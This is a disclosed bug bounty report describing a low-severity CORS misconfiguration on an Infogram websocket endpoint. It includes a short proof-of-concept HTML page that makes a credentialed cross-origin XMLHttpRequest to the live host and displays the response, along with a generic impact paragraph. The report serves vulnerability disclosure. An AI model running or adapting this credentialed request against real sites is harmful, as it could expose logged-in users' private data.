# CORS on (ws.infogram.com)

## Report Details
- **Report ID**: 372452
- **URL**: https://hackerone.com/reports/372452
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-06-28T16:31:36.887Z
- **Disclosed**: 2018-10-08T08:20:46.193Z

## Reporter
- **Username**: real_loser
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: infogram

## Vulnerability Information
Hey Team i don't know if it's valid or not i just want to let you know about this thanks.
```````````
Exploit
``````````````````
<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ws.infogram.com/socket.io/?EIO=3&transport=polling&t=MH7BU79',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

## Impact

As with superpowers, it’s all about knowing how to use it. Therefore, CORS is not necessarily a bad thing. We’ve seen in many cases that CORS has legitimate use, and this is why it was invented and made a web standard in the first place. However, you need to be aware of the CORS configuration you set up in your server and the side effects this has on security.

## Attachments
- Capture.JPG
